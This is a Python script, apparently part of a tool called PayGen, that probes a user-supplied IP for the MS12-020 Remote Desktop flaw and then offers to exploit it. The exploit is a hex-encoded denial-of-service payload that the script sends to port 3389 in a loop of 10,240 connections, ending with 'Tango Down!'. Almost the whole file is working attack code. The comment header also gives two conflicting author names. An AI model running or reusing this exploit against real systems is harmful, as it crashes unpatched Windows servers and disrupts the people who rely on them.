#!/usr/bin/env python
#
# MS12-020 vulnerability check & DoS exploit

import os
import sys
import socket
from struct import pack,unpack
from src.main import *

def ms12020(host):
	
	# orginal code by Worawit Wang (sleepya)
	# Changes made for PayGen compatibility
	
	def make_tpkt(data):
		return pack("!BBH", 3, 0, 4+len(data)) + data

	def make_x224(type, data):
		return pack("!BB", 1+len(data), type) + data

	def make_rdp(type, flags, data):
		return pack("<BBH", type, flags, 4+len(data)) + data


	sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sk.settimeout(10)
	sk.connect((host,3389))

	# connection request
	# x224 type 0xe0 (dst_ref, src_ref, class_opts, data)
	rdp = make_rdp(1, 0, pack("!I", 0))
	x224_1 = make_x224(0xe0, pack("!HHB", 0, 0, 0) + rdp)
	sk.send(make_tpkt(x224_1))
	data = sk.recv(8192)
	if data != "\x03\x00\x00\x0b\x06\xd0\x00\x00\x12\x34\x00":
		PrintError("Cannot check")
		pass
		
	# x224 type 0xf0 (Data TPDU)
	# - EOT (0x80)
	x224_2 = make_x224(0xf0, pack("!B", 0x80))

	# craft connect-initial with gcc
	target_params = (""
		+ "\x02\x01\x22" # maxChannelIds
		+ "\x02\x01\x20" # maxUserIds
		+ "\x02\x01\x00" # maxTokenIds
		+ "\x02\x01\x01" # numPriorities
		+ "\x02\x01\x00" # minThroughput
		+ "\x02\x01\x01" # maxHeight
		+ "\x02\x02\xff\xff" # maxMCSPDUSize
		+ "\x02\x01\x02" # protocolVersion
	)
	min_params = (""
		+ "\x02\x01\x01" # maxChannelIds       
		+ "\x02\x01\x01" # maxUserIds          
		+ "\x02\x01\x01" # maxTokenIds         
		+ "\x02\x01\x01" # numPriorities       
		+ "\x02\x01\x00" # minThroughput       
		+ "\x02\x01\x01" # maxHeight           
		+ "\x02\x01\xff" # maxMCSPDUSize
		+ "\x02\x01\x02" # protocolVersion
	)
	max_params = (""
		+ "\x02\x01\xff" # maxChannelIds           
		+ "\x02\x01\xff" # maxUserIds              
		+ "\x02\x01\xff" # maxTokenIds             
		+ "\x02\x01\x01" # numPriorities           
		+ "\x02\x01\x00" # minThroughput           
		+ "\x02\x01\x01" # maxHeight               
		+ "\x02\x02\xff\xff" # maxMCSPDUSize
		+ "\x02\x01\x02" # protocolVersion
	)
	mcs_data = (""
		+ "\x04\x01\x01" # callingDomainSelector
		+ "\x04\x01\x01" # calledDomainSelector
		+ "\x01\x01\xff" # upwardFlag
		+ "\x30" + pack("B", len(target_params)) + target_params
		+ "\x30" + pack("B", len(min_params)) + min_params
		+ "\x30" + pack("B", len(max_params)) + max_params
		+ "\x04\x00" # userData
	)

	# \x7f\x65  BER: APPLICATION 101 = Connect-Initial (MCS_TYPE_CONNECTINITIAL)
	mcs = "\x7f\x65" + pack("!B", len(mcs_data))
	sk.send(make_tpkt(x224_2 + mcs + mcs_data))

	# attach user request
	sk.send(make_tpkt(x224_2 + "\x28"))
	data = sk.recv(8192)
	user1 = unpack("!H", data[9:11])[0]

	sk.send(make_tpkt(x224_2 + "\x28"))
	data = sk.recv(8192)
	user2 = unpack("!H", data[9:11])[0]

	# join its own channel (prevent BSOD)
	sk.send(make_tpkt(x224_2 + "\x38" + pack("!HH", user2, user2+1001)))
	data = sk.recv(8192)

	# channel join request
	sk.send(make_tpkt(x224_2 + "\x38" + pack("!HH", user1, user2+1001)))
	data = sk.recv(8192)
	if data[7:9] == "\x3e\x00":
		PrintInfo("The system is VULNERABLE\n")
		exploit = raw_input("Do you want to exploit the target (Y/N)? ")
		if exploit == 'y' or exploit == 'Y' or exploit == '':
			PrintInfo("Exploiting target. Please wait.")
			
			# Exploit Title: Pakyu Cenloder
			# Date: March 16 2012
			# Author: BMario
			# Application Link: Microsoft Terminal Services / Remote Desktop Services
			#          http://msdn.microsoft.com/en-us/library/aa383015(v=vs.85).aspx
			# Version: any Windows version before 13 Mar 2012
			# Platforms:    Windows
			# Bug:          use after free
			# Exploitation: remote, versus server
			# Author:       Stanley Marshall
			# CVE : MS12-020

			headpack = "030000130ee000000000000100080000000000".decode('hex')
			dafuq = "030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c0".decode('hex')
			dafree = "0300000802f08028".decode('hex')

			trololo = headpack+dafuq+dafree

			HOSTNYO = host
			PORTNYO = 3389
			for i in range(10240):
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((HOSTNYO,PORTNYO))
				s.send(trololo)
				rec = s.recv(1024)
				s.close()
			  
			PrintInfo("Tango Down!")
			EntContinue()
	
	else:
		PrintError("The system is PATCHED\n")				
	sk.close()
		
while 1:
	try:
		clear()
		print """%s%s##########################################
# MS12-020 remote safe checker (no BSOD) #
#                                        #
# Use DoS bug (CVE-2012-0152) for check  #
#                                        #
# by Worawit Wang (sleepya)              #
##########################################
%s""" % (colours.bold, colours.green, colours.reset)

		host = raw_input("Enter target IP: ")
		ms12020(host)
				
		# return to main
		EntContinue()
		break
	except KeyboardInterrupt:
		break
